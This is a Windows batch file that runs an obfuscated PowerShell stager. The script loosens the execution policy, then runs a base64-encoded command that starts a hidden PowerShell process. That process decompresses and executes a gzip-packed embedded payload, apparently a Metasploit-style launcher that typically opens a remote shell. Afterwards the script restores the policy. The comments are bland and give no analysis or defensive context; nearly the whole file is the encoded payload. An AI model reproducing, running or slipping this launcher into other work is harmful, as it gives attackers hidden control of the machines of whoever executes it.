@echo off
:: Set the execution policy to RemoteSigned
powershell.exe -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force"

:: Define the command you want to execute
set command=aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBIAHUAawBMADIAYwBDAEEANwBWAFgAVwAyAC8AYQBTAEIAUgArAHIAOQBUAC8AWQBGAFYASQBHAEkAVgBnAGsAOQBBAHMARwA2AG4AUwBqAG8AMABKAFoAbgBHAEMAWQB6AEMAewAyAH0AbwB0AFgARQBIAHUAeQBwAEIANQB2AGEAWQB5ADcAcAA5AHIALwB2AEcAYwBCAEoAdQBrAG0AcQA3AEUAcQBkAEYAegBNAHoANQAvAHEAZAAyADcARABJAFkANAAvAFQASgBKAFoAWQBUAC8AcgAyAC8AcAAxADAAWABIADIAYwA0AHEAVQBrAGwAewAyAH0AWgA1AFYAUwBwADkAcABYAGQAQgBWAG4AbQA4AEwASAAnACcAKwAnACcARwA5AEkAewAyAH0AMgBTADUAQgBsAGEAcgBWAHIASgBFAHQATgA0AGYAbgBtAHAANQAyAGwASwBZAG4ANwBZADEAJwAnACsAJwAnADYANABJAFIAMQBsAEcAbABuAGUATQBrAGsAeQB1AFMASAA5AEwAbwA1AEMAawA1AFAAVABtADcAZwB2AHgAdQBQAFIATgBLAHYAMQBWAHUAMgBMAEoASABXAFoASABzAHAAMgBPAHYAWgBCAEkAcAB5AGoAMgB4AFYAMAB2ADgAewAxAH0AQQB3AHEAKwBhAHMARwBPAFYAeQArAGYAUABuAGMAbQBWADIAVwBwAC8AWABqAEsAOAA1AFoAcABsAGMAZABuAFkAWgBKADgAdQBhAHoAMQBpADUASQBuADIAdgBDAEkAVwBEAHsAMgB9AFkAcgBJAFoAWQB0ADYAYQBaAEkAbAAnACcAKwAnACcAQwAxADQAewAxAH0AMABmAGoAOAByAEQAYQBNAE0ANwB3AGcAMQB5AEIAdABUAFMAegBDAHcAOABUAFAAeQB1AEQATABvAHoAYwBwADQAWABrAGEANwA1ADAAUwBVAGcANAAwAGMAaABsACsAOQB0AFAARQBRADcANgBmAGsAaQB3AHIAVgA2AFcAWgBrAEQAKwB7ADEAfQB6AC8AKwBRAFoAMABmAGwAdAB7ADIAfQBuAE0ANgBaAEwAVQB6AEoAaQBUAE4ARgBrADUASgBGADEAVABqADIAUwAxAEQAbwA1ADkAUgBtADcASgBZAGcANQBjAEQAawA5AHAASABNAHcAcgBGAFMAQgB7ADEAfQBKAHgARwBSAFMAewAyAH0ASABPAFcARgBYADYATAAyAEwAawBhADcASQBwAG8ASABzAHIAawAvAHkAVQBDAGEAagA2AFAASwAxAFUASQBhAEwAUAB7ADIAfQB7ADEAfQBRAFMAUAAyAGYAawB3AEYAaAArAHcAVQA1AEkAZwBnAHEAcwBoADAAUQBBADkATAA0AEwAQQBCAGQARgA2AHUAQwBMAEYAMQBMAG4AJwAnACsAJwAnADgAYQBCAFkAcwAvACcAJwArACcAJwAwAE4AQQBYAHYAbABmAHAATABSAFAAZQBzAG4AUwBhADEASwBGAHEAagBHAFAARQBsAHsAMgB9AHMAQwAwAE4AMABwAHgAVQA1AGcAOQBvAFMANgBWADEAMABLAHUAKwBWAFYAaQA5ADQAQgBSADgASQBSAHoATQB7ADIAfQBJAFQANgA4ADAAZgAyAEgAeQBKAGYAQwBtAEoAdABJAEkAaABlAHoAKwBNAFcAVwBkAEMAWQB0AEgAWQB4AFgAbABLAHYAUwBGAFgANQBwAFgAaQBRAEIAUwBOADcATwBHAG8ARgAyAFQAWABZAEoANQBlAFAARgA4AFIAdgBFAFUAWQBDAHoAQQBYAEUASQBpADIAZQBzAFIAbABMAHkAaAA5ADQAdABaAHcAeQBuADYAVABJAGcANQBoAG0AWQBCAFcARQB1AC8ASwBqAE0AWQBlAG8AeQBXAFUAegB0AHMAZwBTAHMARAB2AHMASQBVADkATABDAHkAZwBRAFUAbABBAGYAaQAyAEoAWABhAEIAZAA3AEkAQwByAHIARAAnACcAKwAnACcARwBkAFoAVgBlAHIAbgBVAEsARgBlAFYAWABJAEkAWgBzAFMAdgBTAGkAagBPADYAUABFAEsANQBUAHoAWgAvAHkAdwAvAG0AbQB2AGwAagBGAE0AUABaADcAdwBRAE4ANgAvADgAQwA4ADYAagBXAGoAMgAnACcAKwAnACcASgBNADUANwBtAEgAawBRAFYASQBCAGcANABLACsASgBSAHoAQQBRAGkAVgBhAGwARABmAGEATAB0AEgAQgBvAFUANgBzAHMAdgA0AHEARgBqAHgAcQBCAHkAUQBOAEkAYQAnACcAKwAnACcANABnAEUAbgBBAGcAZQBIAGkAMQB4AEoAdwBWAEsAUgBGADUAVwBhAFEANwBpADUAWABEAEcAeQBCAEoASgA5AHcAMgBnAHoASABFAEIANwBPAEoAewAxAH0ASABQAHIAZAB3AFEAUAB6AHkASwB7ADIAfQBZAFcAWgBYAEQASQBlAFEARgBNAGcAYwBnAFQASwB5AEgAYQBEAGsAdAA0AFYAWABKAHAAeQBxAEgAOQBDAEoARABYADQAZgA4AHgANABYAG4AWAAyAGQAdQBpAHAAKwBRAFkARwByAGsAbwByAHAAbQAyADQAeQBMAC8AUwArAHQAQgBuAG0AbwBpAFMAWQA4AEkANwBmAEYASQBPAFcARABSAFQAcABPAGwAaABqAE4AeQAwAFQAagAwAEcAUABtAEQAWQB0AEQAVwB4AHsAMgB9ADQAcgB1AFUAZQB3AGoAUABhAHQANwBXAHIATwAwAEoAMgBhAGwAdAA5AGwAagBzAG0AZABpAFUARgA3AHcAegBBADAAYQBkADAATQBCAG8ATgBPADEAMABFAG4ANQAwADYAMABNAHUAbAA1ADEAewAyACcAJwArACcAJwB9AFoAYQBIAFoAUwAyAHQAdQBFAEMAbQBaAGwAcABkAEwAUwBkAFgAZABlAFEAMQA2AEcALwB1AFYAMQB0AE8AQQBRACsAcQB2AGYAcwBMACcAJwArACcAJwAxAHMAVAArAGQAbwB5AEcAQQBjAFQAZgBXAFAAMgB3ADcARQBKAGkAdgBSAGUAWQBBAHsAMQB9AHcAMQBjAHoAUQAwADkAUwBwAEcAbQBpAHEANABmAFIAcwBYAHsAMQB9AE0AZAB1ADIATgBUAE4AWgBnADAANgB0AE4AcgB5ADIATwBtADAAbQBRAGEAdgBYAGQATQBCAHsAMgB9AFYARwBRAHAALwB0AGQAewAxAH0AbwB0AHYAQQBVADkAUgBxAFAAUgBHAFcAOABIADYATgByAHEAbwByAEIAOQA0ADcAZgByAFoAKwB7ADIAfQBRAG8AQwBxAEsAaABJAHgAcABkAE4AVgByAEcAZgB1ADkASgAvAHsAMQB9ADIASgBEAE8AbwBJAGYAUwAwAEoANwBZAHsAMQB9AGsAcABHADcAMABrAFoARwBlADIAcQA3AEsAegBNADQAMgBRAFMAMgAyADEATQBhADcAVgBDACcAJwArACcAJwBEAGMANQBOAHUAZQB5AHQASABnAFYAVwB2AGQAOQBlAHgAZgAyACsAeAA1AHIAMABGADUAdAByAHUAdABFAHYASgAxAEEAegAnACcAKwAnACcASQBMAGsAQQAyAFEAcwA0AGsAWgBzADcAZABSAGsAZABJAE0AVwBsADAAMgB4ACsAcgA3AFMARwBjAFIAUQBNAHoAewAyACcAJwArACcAJwB9AHQAcAB7ADIAfQBLADgAdgBmAFQAVAByAEsANwA2ADUARgB5AFMAcABCAHQAbwBGAFEAbQAwAEcAUgBMAGgASABlAHQASgBUACcAJwArACcAJwA2AEsAUABuAFQAZABqAC8AYQBRADAAUABkADcAbwB7ADEAfQBxAGQAbQBOADgAVQBUAFkARwA3AFcANgBpADQAewAyAH0AZAA0AGQAWABFAFIASwBJAHQARwBYAHsAMgB9AEUAZABNACsANwBnAFUAQQBOADcAZAA5ADEARwBSAEwAcwBuAGMATABmAEUAcgBqAHAAWgBLAEsANwBBAFQANAA5AGkANQBUADQAZQBzADQAdQB1AHQAYwBjAFUALwBMAEcAQgBoADQAcAA0ADQAZQBBAFcAKwBBADQAOABpAE0AZgBtAFcARgBIAGMAUQBBAG4AUQBnAHIAbABtADAATABTAEQAYwBSAEsAZgA0ACcAJwArACcAJwBRAGgAawBqACcAJwArACcAJwB3AEkARQBGAG8ASwBQAEUATwB0AEYAMQB3ACcAJwArACcAJwBUAHMAdABaAHoAUgBhAEgAZwB5AFYAdQBwAEQAcwBFAGQAZABkAHIAZQBxAHMASABYAFoAewAxAH0AWQBLADgAcwArAGcARgBtAFUANABJADIAUABwAFQAagBEAFIAaABoAHoAYQA2AFMAdABBAG8AdQByAHIAUQBkADgAMgArAEIAWAA2ADQAZABaAEEAWgB1AC8AbABnADEAQQBHAFoAWQBIAE0AZQBOAFEAWABNAEUATgB1AFcAbwA4AGQAWABqAGoAawArADgAKwA5AHUATgBlAFgARQBuACsAQgBBAG0AegByAGUAUQBtAC8AMgBSAHQAUgBkAEsAKwA0AEgAeQBQAEwAWgBrAE0AewAxAH0AOAAvAEcAeABlAEMAbQA1AFUATQBRAHsAMQB9AGUAdgB5AHUAUgBOAGYANQByADkAUwBUAFYAWAA1AHQAeABGAGsANgB6AEUARABNAG8AQQBaAGgAZQBSAFMAZABxAEoAMgBuADcATwBKAEQANgBDAFIAVQBjAHMAZwB4AHYAbQBvAGkAawBNAFcASAB3AEQAbwBDAFgAUQBsAEcALwBpAEwASABFAEUAOABNAFEAQgBoAGUATQA0AGMATgB3AEYATABOADYAYQBPADUATgAnACcAKwAnACcAZQB1AGwAWABSAFgAbwBnAHIARAB6AE8AeQBPAEwAbwA4AG4ASQBLAEYAbwBxAE8ASQBLAHEAMQAxAGkATgB4AHcATQBPAHEAdQBqADEAWABWAFoAaAB2ADYAbABaAHQANwBJAHYALwA3AFkANwBwAHkAVwBvACcAJwArACcAJwBuAEgANgBSAFYAeABZAGcAOABZACcAJwArACcAJwBQAE8AZwBnAE8AMABWAGcARQB5ADYAawBHAFQANQBWACsATQBGADcAeQBBAE8AVABmAGsAMQB4AEYANABEAEQALwBSAEcAMABFAEsAaABwAFIAOAA2AG0ANABCAFEAUwB4AEwAMgBGAE0ARABDAHIANABkAHMAKwBBAEYAQQBRAEsANABPAHoAcwAvAEUARwAwAGoAawBDAFkAZwA0AEoAVgAvAGgAcQBTAHsAMQB9AGUAQwBFAC8AZgBIAEMAWABjAC8ASgBWADUAYwArAHoAUABJAFgAegA4AG4AKwBmAE4ANAA5AGwAUAB7ADEAfQB0ACsAVQBTADIAcgAxAGkATQAyAHoAOAB4ADgAUABuAGcAeQAyAFgAKwB7ADEAfQAvAEMARgBNAE8AZABBADQATQBHAFUAWQBPADcANQA2AFgAWQBEAGgAVwB5AHAAUABvADQAJwAnACsAJwAnAGkAWQBVAHcAZQBLADQAeABMACsAQQBtADUAeQBmAFgAcwBPADcAYwBqAC8AbAAvAGcARgBPAEcAawBMAEwAZgBBAHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBiACcAJwAsACcAJwAzACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA

:: Run the encoded command and keep the CMD window open
powershell.exe -NoProfile -EncodedCommand %command%

:: Reset the execution policy to Restricted
powershell.exe -NoProfile -Command "Set-ExecutionPolicy Restricted -Scope CurrentUser -Force"